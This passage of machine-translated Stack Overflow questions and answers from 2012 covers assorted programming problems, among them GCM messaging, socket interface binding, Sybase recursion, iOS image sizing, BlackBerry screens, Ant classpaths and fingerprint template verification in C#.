[控制器对象](http://docs.python.org/library/webbrowser.html#browser-controller-objects)不可调用。做这个：

```
controller.open(url) 
```

# android - 使用 GCM 从服务器向应用程序发送消息

> ID：11847500
> 
> 赞同：4
> 
> 时间：2012-08-07T13:51:51.897
> 
> 标签：android, servlets, google-cloud-messaging

我尝试从[http://developer.android.com/guide/google/gcm/gs.html](http://developer.android.com/guide/google/gcm/gs.html)实现 gcm 我可以将 regid 发送到 servlet 但无法从它获取消息。

小服务程序：

```
if("send".equals(id))
        {
            deviceHolder.put(did, reGid);
            reGid = deviceHolder.get(did);
            if(reGid== null || "".equals(reGid)){
                System.out.println("device is not registered "+did);
            }else{
                Sender sender = new Sender(myApiKey);
                Message message = new Message.Builder()
                .collapseKey("1")
                .timeToLive(3)
                .delayWhileIdle(true)
                .addData("message", "message is created at builder")
                .build();

                Result result = sender.send(message, reGid, 5);
                System.out.println("result of message is "+ result);
            }
        } 
```

GCMINtentService：

```
@Override
protected void onMessage(Context arg0, Intent arg1) {
Log.i(TAG, "new message= ");
Toast.makeText(getApplicationContext(), arg1.getStringExtra("message"),
Toast.LENGTH_SHORT).show();
} 
```

在控制台：

```
A?u 07, 2012 4:37:08 PM org.apache.catalina.core.StandardWrapperValve invoke
SEVERE: Servlet.service() for servlet [servCloud] in context with path [/servletCloud]   threw exception [Servlet execution threw an exception] with root cause
java.lang.ClassNotFoundException: com.google.android.gcm.server.Sender
at   org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1711)
at    org.apache.catalina.loader.WebappClassLoader.loadClass(WebappClassLoader.java:1556)
at servCloud.doGet(servCloud.java:75)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:225)
at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:927)
at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1001)
at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:585)
at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:310)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
at java.lang.Thread.run(Thread.java:722)

A?u 07, 2012 4:40:37 PM org.apache.catalina.core.StandardContext reload
INFO: Reloading Context with name [/servletCloud] has started
A?u 07, 2012 4:40:38 PM org.apache.catalina.core.StandardContext reload
INFO: Reloading Context with name [/servletCloud] is completed 
```

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-14T08:07:28.023

您的 servlet 类路径应该包含 GCM 服务器 API。确保您的 servlet war 文件中的 WEB-INF/lib 文件夹下有 gcm-server.jar。

# linux - 为什么 netstat 显示错误的外国地址？

> ID：11847502
> 
> 赞同：0
> 
> 时间：2012-08-07T13:51:53.800
> 
> 标签：linux, network-programming

我在一个 debian 6 机器上有几个物理网络接口，每个都有不同的子网 IP 地址。其中两个接口连接到交换集线器，因此它们可以相互通信。我想在 2 个接口之间建立 TCP 连接。

这就是我所做的：我首先得到一个 SOCK_STREAM 套接字。然后我使用 setsockopt(..., SO_BINDTODEVICE,...) 将套接字绑定到特定接口 eth4。然后我设置了一个 sockaddr_in 结构并使用该接口（eth4）的端口和地址填充它。然后我调用 bind() 将该本地地址/端口绑定到套接字。然后我做一个listen（），然后是一个accept（）。这会阻止等待传入的连接请求。此时我可以做一个 netstat，它完全显示了我的预期，即套接字确实处于 LISTEN 状态，并且本地地址正确显示了 eth4 地址和端口。

然后在一个单独的程序中，我有一个获取套接字的例程，然后 setsockopt(..., SO_BINDTODEVICE,...) 将套接字绑定到不同的接口 eth5。然后，我使用与 eth4 接口相同的端口号和 eth4 接口的地址设置了一个 sockaddr_in 结构。然后我做一个连接（）。一切顺利，连接成功，我的日志确实显示这两个进程确实与这个 TCP 连接相连。

但是当我执行 netstat 时，它显示 2 个 PID/程序已连接，但本地地址和外部地址都显示来自 eth4 的相同地址，即使我专门将连接端绑定到 eth5 的地址。

所以，我的问题是为什么 netstat 为连接的两端显示相同的地址？

我能想到的唯一解释是内核识别出连接目标地址实际上是本地的，然后忽略了我所做的 SO_BINDTODEVICE 绑定，并使 TCP 连接成为内部而不是实际走出 eth5 连接到 eth4。

如果这是正确的，那么我该如何在同一个 linux 机器上的 2 个独立接口之间建立 TCP 连接，但实际上是在外部而不是内部？

-安德烈斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T15:24:41.483

您可以尝试`bind`在之前调用`connect`客户端套接字，以将其与您要使用的传出接口 (eth5) 的特定 IP 地址相关联（端口可以设置为 0，因为在这种情况下它对客户端无关紧要）。这种方法似乎是使用`SO_BINDTODEVICE`选项的替代方法。

我发现一篇文章提供了几种设置此选项的方法（http://stackoverflow.com/a/6566111/276274）。第一个是将字符串传递给`setsockopt`设备名称，另一个是通过`struct ifreq`填充接口索引传递 via `ioctl`。您可以尝试使用接口索引探索第二个。

另一个潜在的问题来源可能是设置此选项似乎需要 root 权限。

如果您可以在设置选项的位置发布代码片段，这可能会有所帮助。

# mysql - 重复代码的更好解决方案，需要优雅

> ID：11847506
> 
> 赞同：0
> 
> 时间：2012-08-07T13:51:57.677
> 
> 标签：mysql, sql, sybase

我目前正在编写一个程序，我在 syBase 中设置了一个文件系统我想找到所有包含我指定的文件的文件，然后我希望它找到包含所有这些文件的所有文件和很快。

现在我的代码可以工作并返回我想要的所有文件，但是我想要一个更优雅的版本，因为目前它有很多重复代码并且无论如何都不能涵盖所有文件。

我试过循环，但我运气不好。

```
INSERT #nodes 
    SELECT from_file
    FROM file_map 
    WHERE to_file = @fileNode

    insert #fileList
    SELECT DISTINCT file
    from #nodes

INSERT #nodes1
    SELECT from_file
    FROM file_map m
    INNER JOIN #nodes n ON m.to_file = n.file
    WHERE m.to_file LIKE '/%'

    INSERT #fileList
    SELECT DISTINCT file
    FROM #nodes1

INSERT #nodes2
    SELECT from_file
    FROM file_map m
    INNER JOIN #nodes1 n ON m.to_file = n.file
    WHERE m.to_file LIKE '/%'

    INSERT #fileList
    SELECT DISTINCT file
    FROM #nodes2

INSERT #nodes3
    SELECT from_file
    FROM file_map m
    INNER JOIN #nodes2 n ON m.to_file = n.file
    WHERE m.to_file LIKE '/%'

    INSERT #fileList
    SELECT DISTINCT file
    FROM #nodes3 
```

这是一个非常简单的过程，我只是想不出一种让这个更整洁/更快的方法。

这只是一个例子，系统可能有 30 个文件深度，所以我不想创建 30 个临时表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:06:22.757

您要做的是从层次结构中检索数据。可以改进您的解决方案，但您可能必须对数据库进行一些更改。SitePoint 上有一篇文章，标题[Storing Hierarchical Data in a Database](http://www.sitepoint.com/hierarchical-data-database-2/)解释了这个概念，很清楚。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:16:30.187

存储过程应该能够处理递归（虽然我不熟悉 Sybase）。我不完全确定您的架构是什么样的，但您可以使用递归来保持代码精简（有时会以性能为代价）。您需要维护一组访问过的文件，以避免无限循环。

# html - 没有网络意图的文本视图链接

> ID：11847511
> 
> 赞同：1
> 
> 时间：2012-08-07T13:52:10.910
> 
> 标签：html, android-intent, textview, android

我有一个用 html 格式的 textview`Html.fromHtml()` 当我点击时，例如，在一个 href 中，一个浏览器被启动。我想要的是处理这个意图，而不是启动浏览器。

这是我的代码：

```
notic = Html.fromHtml(noti.getDescripcion());                
noticiacorregida = CorrigeLinks(notic);
lbl_descripcion.setText(noticiacorregida);
lbl_descripcion.setMovementMethod(LinkMovementMethod.getInstance()); 
```

我需要将 URL 保存在变量中，而不是启动浏览器。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T12:08:29.773

Well, the best I can come up with is make a webview. Use this code. First here is the java.

```
 package com.stackoverflow.images.webview;

import android.app.*;
import android.os.*;
import android.view.*;
import android.widget.*;
import android.content.*;
import android.webkit.*;

public class Site extends Activity
{
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.image);
        WebView webView = (WebView) 
        findViewById(R.id.webview); 
          webView.loadUrl("http://examplesite.com/yourimage");

      }

} 
```

Now here is the XML. Try only to change the package up above in the JAVA and the url. **Make sure everything is correct with JAVA up above like the onCreate layout**

```
 <?xml version="1.0" encoding="utf-8"?>
<WebView
    android:id="@+id/webview"
        xmlns:android="http://schemas.android.com/apk/res/android"
        android:layout_width="fill_parent"
       android:layout_height="fill_parent"
        android:orientation="vertical"
>

    </WebView> 
```

# ios - 从 URL 加载 UIImage 时在 UITableViewCell 中设置 UIImageView 大小？

> ID：11847515
> 
> 赞同：7
> 
> 时间：2012-08-07T13:52:17.213
> 
> 标签：ios, uitableview, uiimageview, uiimage, scale

将图像从 URL 加载到 uiimage，然后将这些图像添加到 uitableviewcell uiimageview，如下面的代码。我不知道图像大小，但需要在 tableviewcell 图像中强制它们为 40x40。图像在 uitableview 中以不同的宽度不断加载。

阅读与 uiimage 大小/缩放相关的其他帖子，但这些解决方案对我不起作用。我在想这是因为我使用的是 uitableviewcell 中包含的 uiimageview，而不是创建自己的 uiimageview。

这是代码>

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

UITableViewCell *cell = [[UITableViewCell alloc] init];

ItemForSale *item = [listOfItems objectAtIndex:indexPath.row];
cell.textLabel.text = item.name;
cell.accessoryType = UITableViewCellAccessoryDisclosureIndicator;
cell.textLabel.font = [UIFont systemFontOfSize:14];

NSURL *url = [NSURL URLWithString: item.imgPath];
UIImage *thumbnail = [UIImage imageWithData: [NSData dataWithContentsOfURL:url]];
if (thumbnail == nil) {
    thumbnail = [UIImage imageNamed:@"noimage.png"] ;
}
cell.imageView.image = thumbnail;
cell.imageView.contentMode = UIViewContentModeScaleAspectFill;
cell.imageView.frame = CGRectMake(0, 0, 40, 40);
cell.imageView.autoresizingMask = UIViewAutoresizingNone;
cell.imageView.clipsToBounds = YES;

return cell;

} 
```

我试过设置内容模式（尝试了aspectfill和aspect fit），尝试重置框架，设置autoresizingmask，clipTobound。没有任何改变。

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-07T14:10:29.780

查看 Apple 示例项目“LazyTableImages”找到了答案

```
NSURL *url = [NSURL URLWithString: item.imgPath];
UIImage *thumbnail = [UIImage imageWithData: [NSData dataWithContentsOfURL:url]];
if (thumbnail == nil) {
    thumbnail = [UIImage imageNamed:@"noimage.png"] ;
}
CGSize itemSize = CGSizeMake(40, 40);
UIGraphicsBeginImageContext(itemSize);
CGRect imageRect = CGRectMake(0.0, 0.0, itemSize.width, itemSize.height);
[thumbnail drawInRect:imageRect];
cell.imageView.image = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext();

return cell; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-12-06T17:37:17.247

我遇到了同样的问题，这对我来说非常有效；

选择 UIImage 并转到属性检查器并检查“剪辑子视图”

确保您为图像的大小设置了约束。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-05T20:41:38.140

当我错误地使用单元格的 imageView 属性而不是我在情节提要中创建的自定义 UIImageView 的属性时，我遇到了这个问题。当我使用对自定义视图的正确引用时，一切都按预期工作。我怀疑你们中的一些人可能做过类似的事情。

# blackberry - 黑莓推屏不弹出

> ID：11847524
> 
> 赞同：1
> 
> 时间：2012-08-07T13:52:55.717
> 
> 标签：blackberry

嗨，我有两个屏幕我不想弹出，因为它们从网络加载数据，我不想一直加载它。但是，如果我尝试从一个导航到另一个，我会收到一个 RuntimeException 说我试图推送一个已经显示的屏幕。pushScreen 有解决办法吗？换屏之类的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T03:14:49.710

[Peter Strange在这里](http://supportforums.blackberry.com/t5/Java-Development/Bring-back-the-screen-to-the-top/td-p/383513)很好地解释了 BlackBerry 屏幕语义。本质上，您应该（如 Rupak 建议的那样）将应用程序逻辑与流程分开。如果您要允许或鼓励用户频繁地重新显示页面，您应该加载一次数据并在本地缓存中保留一段合理的时间，以便您以后可以重新显示它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-12T08:29:38.110

你当然可以按照 Rupak 和 Richard 的建议去做。但是，让我提供另一种选择，这可能需要对您目前拥有的东西进行更少的重新设计。

听起来您在`Screen`实例化 a 时正在执行一些昂贵的操作，对吗？你想避免多次这样做吗？

你是这样推屏幕的吗：

```
UiApplication.getUiApplication().pushScreen(new FooScreen());

UiApplication.getUiApplication().pushScreen(new BarScreen()); 
```

相反，请确保无论您在何处推送屏幕都会**保存屏幕**，以便以后重复使用（至少对于您认为*不应该弹出*的这两个屏幕）。我通常有一个`ScreenController`类来处理这个问题。所以，你可以这样做：

```
if (_fooScreen == null) {
    _fooScreen = new FooScreen();
}
UiApplication.getUiApplication().pushScreen(_fooScreen); 
```

...

```
UiApplication.getUiApplication().pushScreen(_barScreen);
UiApplication.getUiApplication().popScreen(_fooScreen);  // popped but still referenced 
```

...

```
UiApplication.getUiApplication().pushScreen(_fooScreen); // pushed, but not recreated 
```

您不会在每次想要推送它时重新创建屏幕，或者在弹出它时破坏它的状态。

如果这真的不是您想要的，并且您确信您的两个屏幕真的**不**应该被弹出，那么也许它们根本不应该被弹出`Screens`。也许它们应该是`Manager`子类。

也许您只有一个`Screen`（不是两个），它在逻辑上将您最初拥有的两个屏幕的内容管理为两个单独的屏幕。因此，要在它们之间切换，您只需让单`Screen`人执行以下操作：

```
add(_fooManager);
remove(_barManager); 
```

或者

```
replace(_barManager, _fooManager);   // logically similar to "changing" screens 
```

屏幕基本上是为使用推送和弹出语义而构建的。如果这对您不起作用，请使用`Manager`子类。由于`Screen`extends `Manager`，这应该涉及最少的代码更改来以这种方式重构。

您确实失去了一些用于切换屏幕的不错的过渡功能。然而，由于我必须在这些代码可用之前编写 BlackBerry 代码，所以我已经学会了依赖替代技术，[例如这个用于动画字段切换的技术](http://supportforums.blackberry.com/t5/Java-Development/animation-effect-for-horizontal-field-manager/m-p/1310255#M174265)

**将View**层与**Controller**层完全分离通常是可行的方法。但是，特别是对于 BlackBerry 应用程序，我确实认为有时过于严格地遵循 MVC 架构只会增加代码膨胀和维护，并且对于解决您所描述的问题并不是真正必要的。

无论如何，只是一个想法。

# magento - Magento 模板未呈现

> ID：11847528
> 
> 赞同：1
> 
> 时间：2012-08-07T13:53:05.140
> 
> 标签：magento, templates, layout, block

我正在尝试在我的系统上调试“搜索自动完成和建议”扩展。它在一个商店上运行良好，但在另一个安装上却不行。

结果的模板未呈现。该块正在扩展 Mage_Core_Block_Template 并且当我将调试打印添加到块的 _prepareLayout() 时，它会正确显示。

父模板 (blank.phtml) 正确呈现，但无论其内容是什么，子模板 (suggest.phtml) 都没有显示任何内容。

这是父模板代码（blank.phtml）：

```
<?php echo $this->getChildHtml('content') ?> 
```

和布局更新：

```
<?xml version="1.0"?>
<layout version="0.1.0">
    <searchautocomplete_suggest_result>
        <reference name="root">
        <action method="setTemplate"><template>searchautocomplete/blank.phtml</template></action>
        </reference>
        <reference name="content">
            <block type="searchautocomplete/suggest" name="searchautocomplete" template="searchautocomplete/suggest.phtml" />
        </reference>
    </searchautocomplete_suggest_result>
</layout> 
```

我用这个网址测试它：

```
/index.php/searchautocomplete/suggest/result/?q=something 
```

可能是什么问题？

* * *

**更新**

在安装了我的商店的另一个副本并添加了我的自定义项后，此扩展程序似乎工作正常。我将尝试比较旧安装与新安装并发布我的发现。

# ios - 在 iOS 中显示标注和选择注释

> ID：11847529
> 
> 赞同：1
> 
> 时间：2012-08-07T13:53:09.900
> 
> 标签：ios, mapkit, mkannotationview, callouts

我已经处理一个问题好几个小时了，但仍然无法找出问题所在。我在 iOS 中有一个 mapView 应用程序，我在其中显示了一些带有引脚的多边形（区域）。单击此类注释后，我想显示一个标注注释。一次只能显示一个这样的标注。这意味着，在单击另一个区域注释后，当前显示的一个必须消失，另一个应该弹出。这工作得很好，除了有时如果我单击另一个注释它被选中，然后它被取消选择并选择另一个完全不同的注释。这是相关的代码：

```
- (void)didTapMap:(NSSet *)touches {
    CGPoint touchPoint = [touches.anyObject locationInView:self.mapView];
    CLLocationCoordinate2D touchMapCoordinate = [self.mapView convertPoint:touchPoint toCoordinateFromView:self.mapView];

    NSLog(@"Checking for annotation");

    VTParkingZoneAnnotation *tappedAnnotation = [self annotationAtCoordinate:touchMapCoordinate];
    if (tappedAnnotation) {

        NSLog(@"Annotation at coordinate: %@", tappedAnnotation.title);

        [self.mapView setCenterCoordinate:[tappedAnnotation coordinate] animated:YES];
        [self.mapView performSelector:@selector(selectAnnotation:animated:) withObject:tappedAnnotation afterDelay:0.0];
        self.selectedAnnotation = tappedAnnotation;

    } else {

        NSLog(@"No annotation at coordinate");
        self.selectedAnnotation = nil;  
        if (self.calloutAnnotation) [self.mapView removeAnnotation:self.calloutAnnotation];
        [self.delegate mapSourceDidDeselectParkingZone:self];

    }

} 
```

这应该显示标注注释

```
- (void)_showCalloutForParkingZone:(VTParkingZone *)parkingZone {
    NSLog(@"Showing callout for: %@", parkingZone.name);
    VTCalloutAnnotation *callout = [[VTCalloutAnnotation alloc] init];
    callout.parkingZone = parkingZone;
    [self.mapView addAnnotation:callout];
    self.calloutAnnotation = callout;
    [self.delegate mapSource:self didSelectParkingZone:parkingZone];
    MKCoordinateRegion rect = self.mapView.region;
    rect.center = parkingZone.center;
    [self.mapView setRegion:rect animated:YES];
} 
```

这是一些注销输出：

```
2012-08-07 15:48:32.093 Viatag[34651:11603] Checking for annotation
2012-08-07 15:48:32.093 Viatag[34651:11603] Checking annotation: Baierbrunnerstrasse Contiparkplatz
2012-08-07 15:48:32.093 Viatag[34651:11603] Checking annotation: Baierbrunnerstrasse B2Xparkplatz
2012-08-07 15:48:32.094 Viatag[34651:11603] Checking annotation: Altstadt-Lehel
2012-08-07 15:48:32.094 Viatag[34651:11603] Checking annotation: Neuhausen-Nymphenburg
2012-08-07 15:48:32.094 Viatag[34651:11603] Annotation at coordinate: Neuhausen-Nymphenburg
2012-08-07 15:48:32.096 Viatag[34651:11603] Calling _showCalloutForAnnotation: Neuhausen-Nymphenburg
2012-08-07 15:48:32.096 Viatag[34651:11603] Showing callout for: Neuhausen-Nymphenburg
2012-08-07 15:48:32.446 Viatag[34651:11603] Calling _showCalloutForAnnotation: Altstadt-Lehel
2012-08-07 15:48:32.446 Viatag[34651:11603] Showing callout for: Altstadt-Lehel 
```

您可以看到，它首先找到单击的注释（即 Neuhausen-Nymphenburg）并显示标注。但是突然（我不知道为什么） _showCalloutForAnnotation 也被称为另一个区域（Altstadt-Lehel），导致旧区域消失。

似乎其他东西触发了_showCalloutForAnnotation，但我检查了我的整个项目，只有三个对该方法的显式调用，而且没有一个导致这种情况。

谢谢你的帮助。

# html5-canvas - 二维粒子效果的高级画布教程

> ID：11847531
> 
> 赞同：3
> 
> 时间：2012-08-07T13:53:15.687
> 
> 标签：html5-canvas

我的设计概念由 100 个 4 x 4 像素的彩色方块组成。

他们一起创造了一个模式。

我需要做的是 1) 将画布上的正方形动画到它们的原点。(x,y 平移) 2) 在每个单独的正方形上循环颜色

可选地可能会考虑 3d 转换，但现在只是尝试完成上面的 1+2。

谁能指点我一些高级的画布教程来完成这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T15:29:20.280

该视频描述了基本概念，是我发现的最好的：http: [//vimeo.com/36278748](http://vimeo.com/36278748)

`blobArray`通常被称为场景图，`blob`被认为是场景/游戏对象，`draw`包含场景的更新和绘制，您通常希望将它们保存在单独的函数中，以便在绘制时循环可以更新多次（固定频率）很慢（通常的瓶颈）。

不幸的是，我从未发现任何其他值得一提的教程。我通过阅读three.js、Unity 3D、OpenGL和WebGL的教程和资源来学习。然后切换到书籍。

# java - 如何从父级获取线程名称？

> ID：11847533
> 
> 赞同：1
> 
> 时间：2012-08-07T13:53:18.213
> 
> 标签：java, multithreading

在这种情况下如何为父母和孩子设置**相同的名字？**

```
public class ComponentA {
    public static void main(String[] args){

        Bye bye = new Bye();
        Thread t = new Thread(bye);
        t.start();
    }
} 
```

我不能添加`t.setName(Thread.currentThread().getName());`，因为我需要避免更改代码。我正在寻找可以从 AspectJ 类申请的解决方案。有什么方法可以为`run`方法提供参数吗？或者也许在子线程中我们可以得到`parent name`？

**编辑：**

我是说：

*   parent - ComponentA 中的 main
*   孩子 - 再见

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T13:55:28.167

**编辑：**

> 有什么方法可以为 run 方法添加参数吗？或者也许在子线程中我们可以获得父名？

一旦线程启动并`run()`调用了该方法，就无法找到父线程的名称，正如这里的答案中所讨论的那样：

> [如何找到父线程的名称？](https://stackoverflow.com/questions/11722749/how-to-find-the-name-of-the-parent-thread/11722898#11722898)

你当然可以这样做：

```
Bye bye = new Bye();
Thread t = new Thread(bye, Thread.currentThread().getName() + "-child");
t.start(); 
```

这将新创建的线程的名称设置为与其父级的当前线程相关。但是通过您所做的编辑，我看到您无法更改线程的分叉方式。

正如我在其他答案中提到的那样，我认为除了名称之外，您将不得不使用其他一些机制来对线程进行分组。

在该`run()`方法内部，您当然可以调用以将当前线程添加到某些线程集合中以用于报告目的。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-07T14:09:16.620

通过使用`Thread.setName()`.

[在这里阅读更多](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Thread.html)

# ant - 是否可以将 jar 文件从 build.xml 添加到 ant 类路径？

> ID：11847538
> 
> 赞同：0
> 
> 时间：2012-08-07T13:53:35.607
> 
> 标签：ant, pmd

我想将 PMD jar 添加到 ant 构建中，但我想将 jar 签入到源代码控制中，这样其他开发人员就不必修改他们的环境。因此复制到 ant lib 文件夹不是理想的情况。还有另一种方法可以将该 jar 文件添加到 ant 类路径中吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T18:07:10.520

我不喜欢在源代码修订系统中管理存储 jar。我明白为什么，但是 SCM 系统不适合存储大型二进制对象。

以下是使您的构建可跨机器重复的一些替代选项：

# 选项 1：创建“引导”目标

使用 ANT [get 任务](http://ant.apache.org/manual/Tasks/get.html)将 PMD jar 下载到 ANT 可访问的目录中，即 $HOME/.ant/lib：

```
<target name="bootstrap" description="Install jars required by build">
    <mkdir dir="${user.home}/.ant/lib"/>
    <get src="http://search.maven.org/remotecontent?filepath=pmd/pmd/4.3/pmd-4.3.jar" dest="${user.home}/.ant/lib/pmd.jar"/>
</target> 
```

# 选项 2：使用依赖管理

[Ivy](http://ant.apache.org/manual/Tasks/get.html)可用于管理所有构建的依赖项（类似于 Maven）

使用 ivy 的优点是它可以用来管理你所有的构建类路径（使用配置）：

```
<target name="resolve" description="Use ivy to resolve classpaths">
    <ivy:resolve/>

    <ivy:cachepath pathid="compile.path" conf="compile"/>
    <ivy:cachepath pathid="build.path" conf="build"/>
</target> 
```

然后，一个名为**ivy.xml**的文件将列出您的项目的依赖项

```
<ivy-module version="2.0">
    <info organisation="com.myspotontheweb" module="demo"/>

    <configurations>
        <conf name="compile" description="Required to compile application"/>
        <conf name="build"   description="Required by the ANT build"/>
    </configurations>

    <dependencies>
        <!-- compile dependencies -->
        <dependency org="org.slf4j" name="slf4j-api" rev="1.6.4" conf="compile->default"/>

        <!-- build dependencies -->
        <dependency org="pmd" name="pmd" rev="4.3" conf="build->default"/>    
    </dependencies>

</ivy-module> 
```

此选项看起来更复杂，但它可用于管理所有 3rd 方 jar。它还具有了解 jar 可能对其他 jar 具有传递依赖关系的好处。

# 选项 3：声纳

不知道大家有没有听说过[Sonar](http://www.sonarsource.org/)项目？

可以使用选项 1 或 2 安装单个 jar 文件，这将自动下载以下分析工具所需的 jar：

*   PMD
*   查找错误
*   格纹风格

很值得研究！

# c# - Digital Persona SDK 验证速度慢？

> ID：11847539
> 
> 赞同：1
> 
> 时间：2012-08-07T13:53:39.713
> 
> 标签：c#, digital-persona-sdk

我想就如何改进我的 C# 代码以进行 Digital Persona SDK 验证提出一些建议。我注意到当我在数据库中达到 3000 条 blob 记录并将它们全部放在一个 DPFP.Template[] 模板数组中时。它只是运行得很慢。

有一个更好的方法吗？

这是我的代码：

```
 foreach (DPFP.Template template in templateArr)
        {
            count--;
            String my_id = empids[count].ToString();
            // Get template from storage.

            // Compare feature set with particular template.
            ver.Verify(features, template, ref res); // This code loops for all 3000 records and causes the verification to slow down.

            if (res.Verified)
            {
                SetPrompt("You Have ");
                MakeReport("LOGGED IN!");
                getEmployeeData(my_id);
                getStatus(my_id);
                break; // success
            }
        }

        if (!res.Verified)
        {
            SetPrompt("Please ");
            MakeReport("TRY AGAIN!");
        } 
```

这是我从数据库中捕获并放置所有这些 blob 保存的模板的代码： public DPFP.Template[] templateArray() {

```
 //String strSQL = "SELECT emp_id, fpt_template FROM tbl_employees WHERE fpt_template != ''";
        String strSQL = "SELECT emp_id, finger_template FROM tbl_fingers WHERE finger_template != ''";
        DataTable dt;
        DPFP.Template myTemplate;
        dt = this.QueryDataTable(strSQL);
        object objByte;
        byte[] bytData;

        //*** Bind Rows ***//
        if (dt.Rows.Count > 0)
        {

            DPFP.Template[] arrTemplate = new DPFP.Template[dt.Rows.Count];
            Int32 counter = dt.Rows.Count;
            foreach (DataRow dr in dt.Rows) 
            {
                //Object fpt_template = dr["fpt_template"];
                Object fpt_template = dr["finger_template"];
                objByte = (byte[])(fpt_template);
                bytData = (byte[])objByte;

                // Convert Blob data to object and then byte
                System.IO.MemoryStream ms = new System.IO.MemoryStream(bytData);
                myTemplate = new DPFP.Template(ms);
                arrTemplate[counter - 1] = myTemplate;
                counter--;
            }

            return arrTemplate;
        }

        this.Close();
        return null;
    } 
```

顺便说一句，我正在使用 C# 和 MySQL 提前谢谢你！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-12-03T10:27:17.363

好吧，我知道这是一个老问题，但仍然如此。如果您可以使用`Stopwatch`计时验证所需的时间，那将是最好的。无论如何，您可以进行一些优化：

*   使用`for`代替`foreach`;

*   不要每次都在循环内声明变量，在外面做，在循环中重用，

*   不要将所有保存的模板数据放入`DPFP.Template`数组中。
    将每个保存的模板放入`DPFP.Template`循环中的对象中。

*   用于`StringBuilder`字符串操作

目前，我的程序大约需要 2-4 秒来循环遍历 150 个指纹模板，具体取决于样本的质量。我确信有一种搜索算法可以提高这种情况下的性能。

# ios - 使用 xcodebuild 动态更改配置文件时出错

> ID：11847541
> 
> 赞同：2
> 
> 时间：2012-08-07T13:53:45.997
> 
> 标签：ios, xcode, xcodebuild, provisioning-profile

我想自动构建具有不同配置文件的 iPad 应用程序（因为我有不同的 iOS 开发人员帐户）。

我发现我可以直接在 Xcode 的目录中复制配置文件：

```
cp packages/provisioning_profiles/*.* ~/Library/MobileDevice/Provisioning\ Profiles/ 
```

然后我检查我应该使用哪个配置文件：

```
if [[ "$SIGNING_IDENTITY" =~ "myIdentity1" ]]; then
    PROVISIONING_PROFILE="packages/application-packages/provisioning_profiles/Wildcard_ADHOC.myIdentity1.mobileprovision"
else
    PROVISIONING_PROFILE="packages/application-packages/provisioning_profiles/Wildcard_ADHOC.myIdentity2.mobileprovision"
fi 
```

然后我尝试使用 Xcode 构建：

```
xcodebuild -scheme "myapp" -configuration "Archive" -sdk "iphoneos5.1" PROVISIONING_PROFILE="$PROVISIONING_PROFILE" clean CONFIGURATION_BUILD_DIR=../build 
xcodebuild -scheme "myapp" -configuration "Archive" -sdk "iphoneos5.1" PROVISIONING_PROFILE="$PROVISIONING_PROFILE" archive CONFIGURATION_BUILD_DIR=../build 
```

在我尝试动态更改配置文件之前一切正常，现在我收到了这个错误：

检查依赖项代码签名错误：找不到配置文件“6E50482A-AD93-4A0A-B8E4-xxxxxx”

此外，我不知道这个“6E50482A-AD93-4A0A-B8E4-xxxxxx”是从哪里来的

有人知道我的问题吗？

是否可以使用 xcodebuild nah 动态更改配置文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-08-02T16:05:31.887

是的，可以有多个配置文件。我使用命令行来构建 AdHoc 配置文件或我们的 AppStore 配置文件。而不是指定文件路径，你需要指定配置文件的id，也就是“6E50482A-AD93-4A0A-B8E4-xxxxxx”是什么。我们在每台开发机器上都安装了我们的配置文件，因此您可以通过指定 id 来选择配置文件，例如：

```
if [[ "$SIGNING_IDENTITY" =~ "myIdentity1" ]]; then
    PROVISIONING_PROFILE="6E50482A-AD93-4A0A-B8E4-xxxxxx"
else
    PROVISIONING_PROFILE="97EF81AB-A345-8888-7878-xxxxxx"
fi 
```

如果您没有安装配置文件，您将必须执行一个脚本，在机器上为您安装它们，然后 xcode 可以找到它们。还有另一个答案是[提供 xcodebuild with .mobileprovision 文件](https://stackoverflow.com/questions/11128284/provide-xcodebuild-with-mobileprovision-file/11167851#11167851)

